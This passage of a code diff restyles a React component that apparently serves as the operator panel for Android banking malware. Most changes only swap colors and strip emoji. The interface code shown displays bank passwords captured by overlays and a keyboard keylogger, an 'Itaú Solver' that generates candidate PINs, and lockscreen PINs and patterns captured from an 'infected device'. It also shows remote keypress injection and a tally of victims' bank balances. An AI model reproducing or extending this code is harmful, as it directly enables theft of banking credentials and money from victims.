                                                     <div className={`w-2.5 h-2.5 rounded-full border-2 bg-slate-950 transition-all duration-300 ${
                                                       isPass 
-                                                        ? 'border-rose-500 shadow-[0_0_8px_rgba(244,63,94,0.8)] group-hover:scale-110' 
+                                                        ? 'border-[#ef4444] shadow-[0_0_8px_rgba(244,63,94,0.8)] group-hover:scale-110' 
                                                         : isClick 
-                                                          ? 'border-purple-500 shadow-[0_0_8px_rgba(239,68,68,0.8)] group-hover:scale-110'
+                                                          ? 'border-[#f87171] shadow-[0_0_8px_rgba(239,68,68,0.8)] group-hover:scale-110'
                                                           : isOffline 
                                                             ? 'border-amber-500 shadow-[0_0_8px_rgba(245,158,11,0.6)] group-hover:scale-110' 
-                                                            : 'border-cyan-500 shadow-[0_0_8px_rgba(239,68,68,0.6)] group-hover:scale-110'
+                                                            : 'border-[#2a2a31] shadow-[0_0_8px_rgba(239,68,68,0.6)] group-hover:scale-110'
                                                     }`}></div>
                                                   </div>
                                                   
                                                   <div className="flex-1 min-w-0 -ml-4">
                                                     <div className="flex items-center justify-between gap-2 mb-1">
                                                       <div className="flex items-center gap-1.5 flex-wrap">
-                                                        <span className="text-[9px] font-mono text-slate-500 font-bold bg-slate-950/60 px-1.5 py-0.2 rounded border border-slate-900/50">
+                                                        <span className="text-[9px] font-mono text-[#8b8b94] font-bold bg-slate-950/60 px-1.5 py-0.2 rounded border border-[#121214]/50">
                                                           {logTime}
                                                         </span>
                                                         {isPass && (
-                                                          <span className="text-[8px] bg-rose-950/60 text-rose-300 border border-rose-500/40 px-1.5 py-0.2 rounded font-mono font-bold flex items-center gap-0.5 shadow-sm">
-                                                            🔑 Teclado / Senha
+                                                          <span className="text-[8px] bg-rose-950/60 text-rose-300 border border-[#ef4444]/40 px-1.5 py-0.2 rounded font-mono font-bold flex items-center gap-0.5 shadow-sm">
+                                                             Teclado / Senha
                                                           </span>
                                                         )}
                                                         {isClick && (
-                                                          <span className="text-[8px] bg-purple-950/60 text-purple-300 border border-purple-500/40 px-1.5 py-0.2 rounded font-mono font-bold flex items-center gap-0.5 shadow-sm">
-                                                            👆 Clique em Botão
+                                                          <span className="text-[8px] bg-purple-950/60 text-[#fca5a5] border border-[#f87171]/40 px-1.5 py-0.2 rounded font-mono font-bold flex items-center gap-0.5 shadow-sm">
+                                                             Clique em Botão
                                                           </span>
                                                         )}
                                                         {isScreen && (
-                                                          <span className="text-[8px] bg-cyan-950/60 text-cyan-300 border border-cyan-500/30 px-1.5 py-0.2 rounded font-mono font-bold flex items-center gap-0.5">
+                                                          <span className="text-[8px] bg-[#121214]/60 text-[#ef4444] border border-[#2a2a31]/30 px-1.5 py-0.2 rounded font-mono font-bold flex items-center gap-0.5">
                                                              Mudança de Tela
                                                           </span>
                                                         )}
@@ -13252,7 +13331,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                                         )}
                                                         {isOffline && (
                                                           <span className="text-[8px] bg-amber-950/40 text-amber-500 border border-amber-500/20 px-1 py-0.2 rounded font-mono font-bold flex items-center gap-0.5">
-                                                            📴 Offline
+                                                             Offline
                                                           </span>
                                                         )}
                                                       </div>
@@ -13261,9 +13340,9 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                                       <button
                                                         onClick={() => {
                                                           navigator.clipboard.writeText(logText);
-                                                          addLog(`📋 Copiado: ${logText}`);
+                                                          addLog(` Copiado: ${logText}`);
                                                         }}
-                                                        className="opacity-0 group-hover:opacity-100 text-[8px] bg-slate-950 hover:bg-cyan-950/30 text-slate-400 hover:text-cyan-400 border border-slate-900 hover:border-cyan-800/40 px-1.5 py-0.5 rounded transition-all font-mono"
+                                                        className="opacity-0 group-hover:opacity-100 text-[8px] bg-slate-950 hover:bg-[#121214]/30 text-slate-400 hover:text-[#ef4444] border border-[#121214] hover:border-[#24242a]/40 px-1.5 py-0.5 rounded transition-all font-mono"
                                                       >
                                                         Copiar
                                                       </button>
@@ -13271,10 +13350,10 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                                     
                                                     {isItauKeypad && itauPairs.length > 0 ? (
                                                       <div className="space-y-2 mt-1">
-                                                        <div className="flex flex-wrap items-center gap-1.5 bg-black/40 p-2 rounded-lg border border-orange-500/20">
+                                                        <div className="flex flex-wrap items-center gap-1.5 bg-black/40 p-2 rounded-md border border-[#ef4444]/20">
                                                           {itauPairs.map((pair, idx) => (
-                                                            <span key={idx} className="inline-flex items-center gap-1 text-[11px] font-mono font-bold bg-orange-950/60 text-orange-300 border border-orange-500/40 px-2 py-0.5 rounded-md shadow-sm">
-                                                              <span className="text-[9px] text-orange-500/80">T{idx+1}:</span>
+                                                            <span key={idx} className="inline-flex items-center gap-1 text-[11px] font-mono font-bold bg-orange-950/60 text-[#fca5a5] border border-[#ef4444]/40 px-2 py-0.5 rounded-md shadow-sm">
+                                                              <span className="text-[9px] text-[#ef4444]/80">T{idx+1}:</span>
                                                               <span>[{pair[0]} ou {pair[1]}]</span>
                                                             </span>
                                                           ))}
@@ -13282,26 +13361,26 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
 
                                                         {itauPermutations.length > 0 && (
                                                           <details className="group/details">
-                                                            <summary className="cursor-pointer text-[10px] font-bold text-orange-400 hover:text-orange-300 flex items-center justify-between bg-orange-950/40 hover:bg-orange-900/40 px-2.5 py-1 rounded border border-orange-500/30 transition-all select-none">
-                                                              <span>⚡ Exibir {itauPermutations.length} Senhas Possíveis (Itaú Solver)</span>
+                                                            <summary className="cursor-pointer text-[10px] font-bold text-[#f87171] hover:text-[#fca5a5] flex items-center justify-between bg-orange-950/40 hover:bg-[#1a1a1e]/40 px-2.5 py-1 rounded border border-[#ef4444]/30 transition-all select-none">
+                                                              <span> Exibir {itauPermutations.length} Senhas Possíveis (Itaú Solver)</span>
                                                               <button
                                                                 type="button"
                                                                 onClick={(e) => {
                                                                   e.preventDefault();
                                                                   e.stopPropagation();
                                                                   navigator.clipboard.writeText(itauPermutations.join('\n'));
-                                                                  addLog(`📋 Copiado ${itauPermutations.length} senhas🏦 Itaú geradas!`);
+                                                                  addLog(` Copiado ${itauPermutations.length} senhas Itaú geradas!`);
                                                                 }}
-                                                                className="ml-2 text-[9px] bg-orange-500 hover:bg-orange-400 text-black px-2 py-0.5 rounded font-black font-mono shadow transition-all"
+                                                                className="ml-2 text-[9px] bg-[#ef4444] hover:bg-[#f87171] text-black px-2 py-0.5 rounded font-black font-mono shadow transition-all"
                                                               >
                                                                 Copiar {itauPermutations.length} Senhas
                                                               </button>
                                                             </summary>
-                                                            <div className="mt-2 grid grid-cols-4 sm:grid-cols-6 gap-1 max-h-36 overflow-y-auto p-2 bg-slate-950 rounded-lg border border-slate-800 font-mono text-[10px] text-orange-300 custom-scrollbar select-all">
+                                                            <div className="mt-2 grid grid-cols-4 sm:grid-cols-6 gap-1 max-h-36 overflow-y-auto p-2 bg-slate-950 rounded-md border border-[#24242a] font-mono text-[10px] text-[#fca5a5] custom-scrollbar select-all">
                                                               {itauPermutations.map((pinCombo, pIdx) => (
-                                                                <div key={pIdx} className="bg-orange-950/30 border border-orange-500/20 rounded px-1.5 py-0.5 text-center font-bold tracking-wider hover:bg-orange-500 hover:text-black transition-colors cursor-pointer" title="Clique para copiar este PIN" onClick={() => {
+                                                                <div key={pIdx} className="bg-orange-950/30 border border-[#ef4444]/20 rounded px-1.5 py-0.5 text-center font-bold tracking-wider hover:bg-[#ef4444] hover:text-black transition-colors cursor-pointer" title="Clique para copiar este PIN" onClick={() => {
                                                                   navigator.clipboard.writeText(pinCombo);
-                                                                  addLog(`📋 Copiado PIN🏦 Itaú: ${pinCombo}`);
+                                                                  addLog(` Copiado PIN Itaú: ${pinCombo}`);
                                                                 }}>
                                                                   {pinCombo}
                                                                 </div>
@@ -13311,14 +13390,14 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                                         )}
                                                       </div>
                                                     ) : (
-                                                      <p className={`text-xs font-mono break-all leading-relaxed select-all px-2.5 py-1.5 rounded-lg border shadow-inner ${
+                                                      <p className={`text-xs font-mono break-all leading-relaxed select-all px-2.5 py-1.5 rounded-md border shadow-inner ${
                                                         isPass 
-                                                          ? 'text-rose-200 bg-rose-950/30 border-rose-900/50 font-bold' 
+                                                          ? 'text-rose-200 bg-rose-950/30 border-[#1a1a1e]/50 font-bold' 
                                                           : isClick 
                                                             ? 'text-purple-200 bg-purple-950/30 border-purple-900/50 font-semibold'
                                                             : isScreen 
-                                                              ? 'text-cyan-200 bg-cyan-950/20 border-cyan-900/30' 
-                                                              : 'text-slate-100 bg-black/40 border-slate-900/80'
+                                                              ? 'text-[#e8e8ea] bg-[#121214]/20 border-[#1a1a1e]/30' 
+                                                              : 'text-slate-100 bg-black/40 border-[#121214]/80'
                                                       }`}>
                                                         {logText}
                                                       </p>
@@ -13354,9 +13433,9 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
 
                     return (
                       <div className="space-y-6">
-                        <div className="bg-gradient-to-br from-slate-900 to-slate-950 p-5 rounded-2xl border border-slate-800 shadow-xl">
-                          <h3 className="text-sm font-bold text-slate-200 mb-1">💰 Saldo Total Detectado</h3>
-                          <p className="text-xs text-slate-500">
+                        <div className="bg-gradient-to-br from-[#121214] to-slate-950 p-5 rounded-md border border-[#24242a] shadow-xl">
+                          <h3 className="text-sm font-bold text-slate-200 mb-1"> Saldo Total Detectado</h3>
+                          <p className="text-xs text-[#8b8b94]">
                             Soma dos saldos mais recentes de todos os bancos capturados no aparelho.
                           </p>
                         </div>
@@ -13365,10 +13444,10 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                         <div className="space-y-3">
                           <h4 className="text-xs font-bold text-slate-450 uppercase tracking-wider">Contas Bancárias Monitoradas</h4>
                           {latestBals.length === 0 ? (
-                            <div className="text-center py-10 bg-slate-900/30 border border-dashed border-slate-800 rounded-xl">
+                            <div className="text-center py-10 bg-[#121214]/30 border border-dashed border-[#24242a] rounded-md">
                               <span className="text-4xl block mb-2 opacity-50"></span>
                               <p className="text-slate-400 text-xs font-bold">Nenhum saldo capturado ainda</p>
-                              <p className="text-slate-600 text-[10px] mt-1 max-w-[240px] mx-auto">
+                              <p className="text-[#6f6f78] text-[10px] mt-1 max-w-[240px] mx-auto">
                                 Abra um aplicativo de banco no dispositivo infectado. O monitor capturará o saldo automaticamente.
                               </p>
                             </div>
@@ -13384,7 +13463,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                   <div 
                                     key={idx}
                                     onClick={() => setSelectedMonitorBank(matchedInstalled || { package: bal.package, name: displayName })}
-                                    className={`relative overflow-hidden cursor-pointer rounded-xl bg-gradient-to-br ${cardGrad} border p-4 shadow-lg transition-all hover:scale-[1.02] hover:shadow-[0_0_15px_rgba(255,255,255,0.05)]`}
+                                    className={`relative overflow-hidden cursor-pointer rounded-md bg-gradient-to-br ${cardGrad} border p-4 shadow-lg transition-all hover:scale-[1.02] hover:shadow-[0_0_15px_rgba(255,255,255,0.05)]`}
                                   >
                                     <div className="flex justify-between items-start mb-4">
                                       <div className="flex items-center space-x-2">
@@ -13418,7 +13497,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
             {/*  COFRE DE SENHAS BANCRIAS */}
             <FloatingWindow
               id="bankPasswords"
-              title="”‘ SENHAS BANCRIAS CAPTURADAS"
+              title=" SENHAS BANCRIAS CAPTURADAS"
               isOpen={floatingWindows.bankPasswords.open}
               position={{ x: floatingWindows.bankPasswords.x, y: floatingWindows.bankPasswords.y }}
               size={{ width: floatingWindows.bankPasswords.width, height: floatingWindows.bankPasswords.height }}
@@ -13429,14 +13508,14 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
               onResize={(w, h) => updateWindowSize('bankPasswords', w, h)}
               headerColor="bg-gradient-to-r from-orange-700 via-amber-700 to-yellow-600"
             >
-              <div className="p-3 h-full overflow-y-auto bg-gradient-to-br from-slate-950 via-orange-950/20 to-slate-900 flex flex-col">
+              <div className="p-3 h-full overflow-y-auto bg-gradient-to-br from-slate-950 via-orange-950/20 to-[#121214] flex flex-col">
                 {/* Control bar */}
-                <div className="bg-slate-900/90 border border-orange-500/30 rounded-xl p-2.5 mb-3 flex-shrink-0 space-y-2 shadow-lg">
+                <div className="bg-[#121214]/90 border border-[#ef4444]/30 rounded-md p-2.5 mb-3 flex-shrink-0 space-y-2 shadow-lg">
                   <div className="flex items-center justify-between">
                     <h3 className="text-white font-black flex items-center text-xs tracking-wider">
-                      <span className="text-base mr-1.5">🔑</span>
+                      <span className="text-base mr-1.5"></span>
                       COFRE DE SENHAS
-                      <span className="ml-2 px-2 py-0.5 bg-orange-600 text-white text-[10px] rounded-full font-mono font-bold shadow-[0_0_8px_rgba(234,88,12,0.5)]">
+                      <span className="ml-2 px-2 py-0.5 bg-[#84cc16] text-white text-[10px] rounded-full font-mono font-bold shadow-[0_0_8px_rgba(234,88,12,0.5)]">
                         {bankPasswords.length}
                       </span>
                     </h3>
@@ -13446,11 +13525,11 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                         onClick={() => {
                           const textToCopy = bankPasswords.map(p => `[${p.bank || 'Banco'}] ${p.label || p.hint || 'Senha'}: ${p.password}`).join('\n');
                           navigator.clipboard.writeText(textToCopy);
-                          addLog(`📋 Copiadas todas as ${bankPasswords.length} senhas capturadas`);
+                          addLog(` Copiadas todas as ${bankPasswords.length} senhas capturadas`);
                         }}
-                        className="text-[9px] bg-orange-950 hover:bg-orange-900 text-orange-300 font-bold px-2 py-1 rounded border border-orange-500/40 transition-all font-mono shadow-sm"
+                        className="text-[9px] bg-orange-950 hover:bg-[#1a1a1e] text-[#fca5a5] font-bold px-2 py-1 rounded border border-[#ef4444]/40 transition-all font-mono shadow-sm"
                       >
-                        📋 Copiar Todas
+                         Copiar Todas
                       </button>
                     )}
                   </div>
@@ -13460,17 +13539,17 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                     <div className="relative">
                       <input
                         type="text"
-                        placeholder="” Buscar senha ou banco..."
+                        placeholder=" Buscar senha ou banco..."
                         value={bankPasswordSearch}
                         onChange={(e) => setBankPasswordSearch(e.target.value)}
-                        className="w-full text-[11px] bg-slate-950 border border-slate-800 rounded px-2 py-1 text-slate-200 placeholder-slate-500 focus:outline-none focus:border-orange-500 font-mono"
+                        className="w-full text-[11px] bg-slate-950 border border-[#24242a] rounded px-2 py-1 text-slate-200 placeholder-[#8b8b94] focus:outline-none focus:border-[#ef4444] font-mono"
                       />
                     </div>
 
                     <select
                       value={bankPasswordBankFilter}
                       onChange={(e) => setBankPasswordBankFilter(e.target.value)}
-                      className="text-[11px] bg-slate-950 border border-slate-800 rounded px-2 py-1 text-slate-200 focus:outline-none focus:border-orange-500 font-mono"
+                      className="text-[11px] bg-slate-950 border border-[#24242a] rounded px-2 py-1 text-slate-200 focus:outline-none focus:border-[#ef4444] font-mono"
                     >
                       <option value="ALL"> Todos os Bancos</option>
                       <option value="itau">Itaú</option>
@@ -13510,10 +13589,10 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
 
                   if (bankPasswords.length === 0) {
                     return (
-                      <div className="text-center py-12 text-slate-400 bg-slate-950/50 rounded-xl border border-slate-900 flex-1 flex flex-col items-center justify-center p-4">
-                        <div className="text-4xl mb-3 animate-pulse">”</div>
+                      <div className="text-center py-12 text-slate-400 bg-slate-950/50 rounded-md border border-[#121214] flex-1 flex flex-col items-center justify-center p-4">
+                        <div className="text-4xl mb-3 animate-pulse"></div>
                         <p className="text-sm font-bold text-slate-300">Aguardando capturas de senhas...</p>
-                        <p className="text-xs text-slate-500 mt-2 max-w-[240px]">
+                        <p className="text-xs text-[#8b8b94] mt-2 max-w-[240px]">
                           As senhas digitadas nos apps de banco ou overlays serão salvas automaticamente aqui.
                         </p>
                       </div>
@@ -13522,8 +13601,8 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
 
                   if (filtered.length === 0) {
                     return (
-                      <div className="text-center py-8 text-slate-500 bg-slate-950/40 rounded-xl border border-slate-900 flex-1 flex flex-col items-center justify-center">
-                        <span className="text-2xl mb-1">”</span>
+                      <div className="text-center py-8 text-[#8b8b94] bg-slate-950/40 rounded-md border border-[#121214] flex-1 flex flex-col items-center justify-center">
+                        <span className="text-2xl mb-1"></span>
                         <span className="text-xs">Nenhuma senha corresponde aos filtros.</span>
                       </div>
                     );
@@ -13536,21 +13615,21 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                         return (
                           <div 
                             key={pwd.id || i} 
-                            className="bg-gradient-to-r from-slate-900 via-slate-950 to-orange-950/40 border border-orange-500/40 rounded-xl p-3 shadow-md hover:border-orange-400/70 transition-all"
+                            className="bg-gradient-to-r from-[#121214] via-slate-950 to-orange-950/40 border border-[#ef4444]/40 rounded-md p-3 shadow-md hover:border-[#f87171]/70 transition-all"
                           >
                             <div className="flex items-center justify-between mb-2">
                               <div className="flex items-center space-x-2 min-w-0 flex-1">
                                 <span className="text-xl flex-shrink-0">{logoEmoji}</span>
                                 <div className="min-w-0">
-                                  <span className="font-black text-orange-300 text-sm truncate block">{pwd.bank || 'Banco'}</span>
-                                  <span className="text-[9px] text-slate-500 font-mono truncate block">{pwd.package}</span>
+                                  <span className="font-black text-[#fca5a5] text-sm truncate block">{pwd.bank || 'Banco'}</span>
+                                  <span className="text-[9px] text-[#8b8b94] font-mono truncate block">{pwd.package}</span>
                                 </div>
                               </div>
                               <div className="flex flex-col items-end flex-shrink-0 ml-2">
                                 <span className="text-[9px] text-slate-400 font-mono">
                                   {new Date(pwd.timestamp).toLocaleTimeString('pt-BR')}
                                 </span>
-                                <span className="px-1.5 py-0.5 bg-orange-900/60 text-orange-300 text-[9px] rounded-full font-bold font-mono mt-0.5">
+                                <span className="px-1.5 py-0.5 bg-[#1a1a1e]/60 text-[#fca5a5] text-[9px] rounded-full font-bold font-mono mt-0.5">
                                   {pwd.digits || (pwd.password ? pwd.password.length : 6)} dígitos
                                 </span>
                               </div>
@@ -13559,7 +13638,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                             {/* Label do campo e fonte */}
                             <div className="mb-2 flex items-center space-x-1.5 flex-wrap gap-1">
                               {(pwd.label || pwd.hint) && (
-                                <span className="px-2 py-0.5 bg-orange-950/80 text-orange-300 text-[10px] rounded font-mono font-bold border border-orange-500/30">
+                                <span className="px-2 py-0.5 bg-orange-950/80 text-[#fca5a5] text-[10px] rounded font-mono font-bold border border-[#ef4444]/30">
                                   {pwd.label || pwd.hint}
                                 </span>
                               )}
@@ -13569,28 +13648,28 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                 </span>
                               )}
                               {pwd.source === 'LOCKSCREEN' && (
-                                <span className="px-2 py-0.5 bg-purple-950 text-purple-400 text-[9px] rounded border border-purple-800/40 font-mono">
-                                  🔒 Lockscreen PIN
+                                <span className="px-2 py-0.5 bg-purple-950 text-[#f87171] text-[9px] rounded border border-purple-800/40 font-mono">
+                                   Lockscreen PIN
                                 </span>
                               )}
                               {pwd.source === 'keyboard' && (
-                                <span className="px-2 py-0.5 bg-cyan-950 text-cyan-400 text-[9px] rounded border border-cyan-800/40 font-mono">
+                                <span className="px-2 py-0.5 bg-[#121214] text-[#ef4444] text-[9px] rounded border border-[#24242a]/40 font-mono">
                                   ¨ Keylogger Teclado
                                 </span>
                               )}
                             </div>
                             
                             {/* Senha capturada com destaque neon */}
-                            <div className="bg-black/80 rounded-lg p-2.5 border border-orange-500/30 shadow-inner flex items-center justify-between gap-2">
+                            <div className="bg-black/80 rounded-md p-2.5 border border-[#ef4444]/30 shadow-inner flex items-center justify-between gap-2">
                               <div className="text-xl font-bold text-emerald-400 tracking-[0.25em] font-mono text-center flex-1 break-all select-all">
                                 {pwd.password}
                               </div>
                               <button
                                 onClick={() => {
                                   navigator.clipboard.writeText(pwd.password);
-                                  addLog(`📋 Senha copiada: ${pwd.password}`);
+                                  addLog(` Senha copiada: ${pwd.password}`);
                                 }}
-                                className="px-2.5 py-1.5 bg-orange-600 hover:bg-orange-500 text-white text-xs font-bold rounded-lg transition-colors shadow-md flex items-center gap-1 flex-shrink-0"
+                                className="px-2.5 py-1.5 bg-[#84cc16] hover:bg-[#ef4444] text-white text-xs font-bold rounded-md transition-colors shadow-md flex items-center gap-1 flex-shrink-0"
                               >
                                 Copiar
                               </button>
@@ -13604,10 +13683,10 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
               </div>
             </FloatingWindow>
             
-            {/* 🔒 LOCKSCREEN - PIN + Pattern */}
+            {/*  LOCKSCREEN - PIN + Pattern */}
             <FloatingWindow
               id="lockscreen"
-              title="🔒 Lockscreen PIN + Pattern"
+              title=" Lockscreen PIN + Pattern"
               isOpen={floatingWindows.lockscreen.open}
               position={{ x: floatingWindows.lockscreen.x, y: floatingWindows.lockscreen.y }}
               size={{ width: floatingWindows.lockscreen.width, height: floatingWindows.lockscreen.height }}
@@ -13616,11 +13695,11 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
               onFocus={() => bringToFront('lockscreen')}
               onDrag={(x, y) => updateWindowPosition('lockscreen', x, y)}
               onResize={(w, h) => updateWindowSize('lockscreen', w, h)}
-              headerColor="bg-red-700"
+              headerColor="bg-[#ef4444]"
             >
-              <div className="p-3 h-full overflow-y-auto bg-gradient-to-br from-red-900/30 to-gray-900/90">
+              <div className="p-3 h-full overflow-y-auto bg-gradient-to-br from-[#1a1a1e]/30 to-gray-900/90">
                 {/* Tabs PIN / Pattern */}
-                <div className="flex mb-3 bg-[#440e05]/80 rounded-lg p-1">
+                <div className="flex mb-3 bg-[#121214]/80 rounded-md p-1">
                   <button
                     onClick={() => setLockscreenType('PIN')}
                     className={`flex-1 py-2 rounded-md text-sm font-bold transition-all ${
@@ -13629,27 +13708,27 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                         : 'text-gray-400 hover:text-white'
                     }`}
                   >
-                    🔢 PIN
+                     PIN
                   </button>
                   <button
                     onClick={() => setLockscreenType('PATTERN')}
                     className={`flex-1 py-2 rounded-md text-sm font-bold transition-all ${
                       lockscreenType === 'PATTERN' 
-                        ? 'bg-blue-600 text-white shadow-lg' 
+                        ? 'bg-[#ef4444] text-white shadow-lg' 
                         : 'text-gray-400 hover:text-white'
                     }`}
                   >
-                    🔲 Padrão
+                     Padrão
                   </button>
                 </div>
                 
                 {/* Status */}
-                <div className={`mb-3 p-2 rounded-lg text-center text-sm font-bold ${
+                <div className={`mb-3 p-2 rounded-md text-center text-sm font-bold ${
                   isLockscreenActive 
                     ? 'bg-green-600/80 text-white animate-pulse' 
-                    : 'bg-slate-700/80 text-gray-400'
+                    : 'bg-[#2a2a31]/80 text-gray-400'
                 }`}>
-                  {isLockscreenActive ? `🔒 ${lockscreenType} ATIVO` : '🔓 Inativo'}
+                  {isLockscreenActive ? ` ${lockscreenType} ATIVO` : ' Inativo'}
                 </div>
                 
                 {/* Botões de Ação */}
@@ -13657,22 +13736,22 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                   {!isLockscreenActive ? (
                     <button
                       onClick={() => showLockscreen()}
-                      className="flex-1 py-2 bg-gradient-to-r from-red-600 to-red-700 hover:from-red-700 hover:to-red-800 text-white rounded-lg font-bold text-sm transition-all"
+                      className="flex-1 py-2 bg-gradient-to-r from-[#ef4444] to-[#ef4444] hover:from-[#ef4444] hover:to-[#24242a] text-[#10120a] rounded-md font-bold text-sm transition-all"
                     >
-                      🔒 Bloquear
+                       Bloquear
                     </button>
                   ) : (
                     <button
                       onClick={hideLockscreen}
-                      className="flex-1 py-2 bg-gradient-to-r from-gray-600 to-gray-700 hover:from-gray-700 hover:to-gray-800 text-white rounded-lg font-bold text-sm transition-all"
+                      className="flex-1 py-2 bg-gradient-to-r from-gray-600 to-gray-700 hover:from-gray-700 hover:to-gray-800 text-white rounded-md font-bold text-sm transition-all"
                     >
-                      – Desativar
+                       Desativar
                     </button>
                   )}
                 </div>
                 
-                <div className="mb-3 rounded-lg p-2 border border-blue-500/25/50 bg-[#290903]/40">
-                  <div className="text-xs text-gray-400 font-semibold mb-1">📋 PINs capturados</div>
+                <div className="mb-3 rounded-md p-2 border border-[#2a2a31]/25/50 bg-[#1a1a1e]/40">
+                  <div className="text-xs text-gray-400 font-semibold mb-1"> PINs capturados</div>
                   {renderCapturedUnlockPinsList()}
                 </div>
 
@@ -13681,7 +13760,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                 {/* Capturado */}
                 <div className="mb-3">
                   <label className="text-gray-400 text-xs font-semibold block mb-1">
-                    {lockscreenType === 'PIN' ? '🔢 PIN Capturado:' : '🔲 Padrão Capturado:'}
+                    {lockscreenType === 'PIN' ? ' PIN Capturado:' : ' Padrão Capturado:'}
                   </label>
                   <div className="flex gap-2">
                     <input
@@ -13691,8 +13770,8 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                         : (patternInput || capturedPattern || (capturedUnlockPins?.find(log => log.eventType === 'LOCKSCREEN_PATTERN')?.digit || ''))
                       }
                       onChange={(e) => lockscreenType === 'PIN' ? setPinInput(e.target.value) : setPatternInput(e.target.value)}
-                      className="flex-1 bg-black/60 border border-green-500/50 rounded-lg px-3 py-2 text-green-400 font-mono text-lg text-center tracking-widest"
-                      placeholder={lockscreenType === 'PIN' ? '••••' : '14789'}
+                      className="flex-1 bg-black/60 border border-green-500/50 rounded-md px-3 py-2 text-green-400 font-mono text-lg text-center tracking-widest"
+                      placeholder={lockscreenType === 'PIN' ? '' : '14789'}
                     />
                     <button
                       onClick={() => {
@@ -13701,12 +13780,12 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                           : (patternInput || capturedPattern || (capturedUnlockPins?.find(log => log.eventType === 'LOCKSCREEN_PATTERN')?.digit || ''));
                         if (val) {
                           navigator.clipboard.writeText(val);
-                          addLog(`📋 ${lockscreenType} copiado: ${val}`);
+                          addLog(` ${lockscreenType} copiado: ${val}`);
                         }
                       }}
-                      className="px-3 bg-slate-700 hover:bg-slate-600 text-white rounded-lg text-sm"
+                      className="px-3 bg-[#2a2a31] hover:bg-[#6f6f78] text-white rounded-md text-sm"
                     >
-                      📋
+                      
                     </button>
                   </div>
                 </div>
@@ -13722,7 +13801,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                             setPinInput((prev) => prev + n);
                             pressLockKey(String(n));
                           }}
-                          className="py-2.5 bg-slate-700 hover:bg-slate-600 text-white rounded-lg font-bold text-lg transition-all"
+                          className="py-2.5 bg-[#2a2a31] hover:bg-[#6f6f78] text-white rounded-md font-bold text-lg transition-all"
                         >
                           {n}
                         </button>
@@ -13732,24 +13811,24 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                           setPinInput((prev) => prev.slice(0, -1));
                           pressLockKey('DELETE');
                         }}
-                        className="py-2.5 bg-red-700 hover:bg-red-600 text-white rounded-lg font-bold text-sm"
+                        className="py-2.5 bg-[#ef4444] hover:bg-[#ef4444] text-white rounded-md font-bold text-sm"
                       >
-                        ⌫
+                        
                       </button>
                       <button
                         onClick={() => {
                           setPinInput((prev) => prev + '0');
                           pressLockKey('0');
                         }}
-                        className="py-2.5 bg-slate-700 hover:bg-slate-600 text-white rounded-lg font-bold text-lg"
+                        className="py-2.5 bg-[#2a2a31] hover:bg-[#6f6f78] text-white rounded-md font-bold text-lg"
                       >
                         0
                       </button>
                       <button
                         onClick={() => pressLockKey('ENTER')}
-                        className="py-2.5 bg-green-700 hover:bg-green-600 text-white rounded-lg font-bold text-sm"
+                        className="py-2.5 bg-green-700 hover:bg-green-600 text-white rounded-md font-bold text-sm"
                       >
-                        ✓
+                        
                       </button>
                     </div>
                   </div>
@@ -13758,7 +13837,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                 {/* Grid Pattern */}
                 {lockscreenType === 'PATTERN' && (
                   <div className="mb-3">
-                    <div className="grid grid-cols-3 gap-3 max-w-[160px] mx-auto bg-[#440e05]/60 p-4 rounded-xl">
+                    <div className="grid grid-cols-3 gap-3 max-w-[160px] mx-auto bg-[#121214]/60 p-4 rounded-md">
                       {[1,2,3,4,5,6,7,8,9].map(n => {
                         const currentVal = patternInput || capturedPattern || (capturedUnlockPins?.find(log => log.eventType === 'LOCKSCREEN_PATTERN')?.digit || '');
                         const isSelected = currentVal.includes(String(n));
@@ -13773,8 +13852,8 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                             }}
                             className={`w-10 h-10 rounded-full flex items-center justify-center cursor-pointer transition-all ${
                               isSelected
-                                ? 'bg-blue-500 text-white scale-110 shadow-lg shadow-purple-500/50'
-                                : 'bg-slate-700 text-gray-400 hover:bg-slate-600'
+                                ? 'bg-[#ef4444] text-white scale-110 shadow-lg shadow-[#f87171]/50'
+                                : 'bg-[#2a2a31] text-gray-400 hover:bg-[#6f6f78]'
                             }`}
                           >
                             {n}
@@ -13784,38 +13863,38 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                     </div>
                     <button
                       onClick={() => setPatternInput('')}
-                      className="mt-2 w-full py-1.5 bg-slate-700 hover:bg-slate-600 text-gray-300 rounded-lg text-xs"
+                      className="mt-2 w-full py-1.5 bg-[#2a2a31] hover:bg-[#6f6f78] text-gray-300 rounded-md text-xs"
                     >
-                      🔄 Limpar Padrão
+                       Limpar Padrão
                     </button>
                   </div>
                 )}
                 
                 {/* Reprodução Automática */}
-                <div className="bg-[#440e05]/60 rounded-lg p-3">
-                  <div className="text-xs text-gray-400 font-semibold mb-2">🔄 Reprodução Automática</div>
+                <div className="bg-[#121214]/60 rounded-md p-3">
+                  <div className="text-xs text-gray-400 font-semibold mb-2"> Reprodução Automática</div>
                   <div className="flex items-center gap-2 mb-2">
